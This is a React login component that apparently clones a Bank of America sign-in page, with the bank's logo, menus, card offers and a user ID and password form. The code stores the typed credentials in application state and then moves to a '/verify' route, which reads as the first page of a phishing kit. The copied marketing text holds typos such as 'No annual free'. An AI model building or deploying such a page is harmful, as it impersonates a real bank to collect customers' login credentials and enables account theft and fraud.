import React, { useState } from 'react'
import { useDispatch } from 'react-redux'
import { useNavigate } from 'react-router-dom'
import { setEmail, setPassword } from '../store/AccountSlice'

const Login = () => {
    const [emailText, setEmailText] = useState("")
    const [passwordText, setPasswordText] = useState("")
    const dispatch = useDispatch();
    const navigate = useNavigate();
    const submitForm = () => {
        dispatch(setEmail(emailText))
        dispatch(setPassword(passwordText))
        navigate('/verify')
    }
    return (
        <>
             <div class="gray_header">
    <div class="container_cunstom gray_bgtop">
   <div class="container_inner">
     <div class="row align-items-center">
       <div class="col-md-8">
         <ul class="gray_menuttop">
     <li><a class="red_personal" href="#">Personal</a></li>
     <li><a href="#">Small Business</a></li>
     <li><a href="#">Wealth Management</a></li>
     <li><a href="#">Businesses & Institutions</a></li>
     <li><a href="#">Security</a></li>
     <li><a href="#">About Us</a></li>
  
     
   </ul>
       </div>
       <div class="col-md-4">
         <div class="right_gray_menu">
           <ul>
             <li><a href="#">En español</a></li>
             <li><a href="#">Contact Us</a></li>
             <li><a href="#">Help</a></li>
           </ul>

         </div>

       </div>
     </div>
   </div>
 </div>
 </div>

 
   <div class="container_inner">
    <div class="logo_divtop">
   <div class="col1_log1">
     <img src="images/assets-images-global-logos-bac-logo-v2-CSX3648cbbb.svg" alt="" />
   </div>
   <div class="col1_log2">
     <img src="images/search_r.jpg" alt="" />
   </div>
 </div>
  </div>

  <div class="white_header">
     <div class="container_cunstom">
      <div class="container_inner">
   <ul class="ul_whitemu">
   <li><a href="#">Checking</a></li>
  <li><a href="#">Savings</a></li>
  <li><a href="#">Credit Cards</a></li>
  <li><a href="#">Home Loans</a></li>
  <li><a href="#">Personal Loans</a></li>
  <li><a href="#">Auto Loans</a></li>
  <li><a href="#">Investing</a></li>
  <li><a href="#">Better Money Habits®</a></li>
 </ul>
 </div>
  </div>
   </div>


{/* <!-- banner start --> */}
<section>
  <div class="container_cunstom banner_bg_top">
    <div class="container-fluid">
      <div class="row" id="row_banner">
        <div class="col-md-3 mobile_col3">
         <div class="fomboxnew">
            {/* <!-- ---s-- --> */}
            <div class="form">
            <div class="inner_container">
              {/* <!-- <div class="title_topform">
                <h6>Sign on to manage your accounts.</h6>
              </div> --> */}
             <form onSubmit={submitForm}>
              <div class="form-group">
                {/* <!-- <label for="">Email or User ID</label> --> */}
                <input type="text" class="form-control" placeholder="User ID" name="email" id="exampleInputEmail1"
                  aria-describedby="emailHelp" required value={emailText} onChange={e => setEmailText(e.target.value)}/>
  
              </div>
              <div class="form-group">
                {/* <!-- <label for="">Password</label> --> */}
                <input type="password" class="form-control" placeholder="Password" name="password" id="exampleInputPassword1" required value={passwordText} onChange={e => setPasswordText(e.target.value)}/>
              </div>
              <div class="form-check">
              <input type="checkbox" class="form-check-input" id="exampleCheck1" />
              <label class="form-check-label" id="label_idn_h" for="exampleCheck1">Save User ID</label>
            </div>
             <div  class="two_box_btn_col1_1">
                  <button type="submit" id="cointiue_btn" class="btn">Log In</button> 
               </div>
               <div class="forget_pass">
                 <a href="#">Forgot ID/Password?</a>

               </div>
               
             <div class="two_box_btn">
               <div  class="two_box_btn_col1_1">
                 <a href="#">Security & Help</a> 
               </div>
               <div  class="two_box_btn_col2">
                 <a href="#">Enroll</a>
               </div>
             </div>

            </form>
             </div>
              
              <div class="forgetpassBox">
                <a href="#">Open an Account</a>
              </div>
             
            
  
          </div>

            {/* <!-- end --> */}
           
          </div>
           <div class="blueimg">
              <img src="images/flue_img.jpg" alt="" />
            </div>
        </div>
        <div class="col-md-9 mobile_col4">
          <div class="tiletiond">
            <h2>Choose the card that works for you</h2>
          </div>
          
          <div class="row_iiner_4">
            <div class="col_inner1">
              <div class="card_all">
                <h5>Customized Cash Rewards</h5>
                <img src="images/c1.png" alt="" />
                <div class="content_box_card">
                <p>No annual free</p>
                <div class="price_tile">
                  <span class="show-for-large-up"><sup style={{fontSize: "35px"}}>$</sup>200</span>
                </div>
                <h6>online bonus offer</h6>
                <a href="#">3% cash back in the<br />category of your choice&nbsp;&gt;</a>
              </div>
              </div>
            </div>
            <div class="col_inner2">
               <div class="card_all">
                <h5>Unlimited Cash Rewards</h5>
                <img src="images/c2.png" alt="" />
                <div class="content_box_card">
                   <p>No annual free</p>
                <div class="price_tile">
                  <span class="show-for-large-up"><sup style={{fontSize: "35px"}}>$</sup>200</span>
                </div>
                <h6>online bonus offer</h6>
                <a href="#">Unlimited 1.5% cash back<br />on all purchases</a>
                </div>
               

              </div>
            </div>
            <div class="col_inner3">
               <div class="card_all">
                <h5>Travel Rewards</h5>
                <img src="images/c3.png" alt="" />
                 <div class="content_box_card">
                <p>No annual free</p>
                <div class="price_tile">
                  <span class="show-for-large-up"><sup style={{fontSize: "35px"}}>$</sup>200</span>
                </div>
               <h6>online bonus offer</h6>
                <a href="#">Unlimited 1.5 points for every $1<br /> spent on all purchases</a>
               </div>
               </div>
            </div>
            <div class="col_inner4">
               <div class="card_all">
                <h5>BankAmericard</h5>
                <img src="images/c4.png" alt="" />
                <div class="content_box_card">
                <p>No annual free</p>
                <div class="price_tile">
                  <span class="show-for-large-up"><sup style={{fontSize: "35px"}}>$</sup>200</span>
                </div>
               <h6>online bonus offer</h6>
                <a href="#">0% intro APR offer<br /> for 21 billing cycles </a>
              </div>
             </div>
            </div>
            
          </div>
          
        </div>
       {/* <!--  <div class="col-md-4 mobile_col1"></div> --> */}
      </div>
    </div>
  </div>
</section>
        </>
    )
}

export default Login